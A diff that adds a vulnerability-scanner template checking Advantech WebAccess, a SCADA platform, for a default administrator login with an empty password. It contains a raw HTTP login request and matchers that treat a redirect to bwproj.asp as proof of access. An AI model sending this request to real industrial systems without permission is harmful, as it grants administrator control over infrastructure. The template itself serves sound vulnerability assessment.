@@ -1,0 +1,27 @@
+id: advantech-webaccess-default-password
+info:
+  name: ADVANTECH WebAccess Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Advantech WebAccess has a default password vulnerability. An attacker can control the platform with the default credentials (admin:null) and operate core functions with administrator privileges.
+  tags:
+    - default-password
+    - scada
+http:
+  - raw:
+      - |
+        POST /broadweb/user/signin.asp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=/broadweb/signin.asp&pos=&username=admin&password=&remMe=&submit1=登录
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "bwproj.asp"
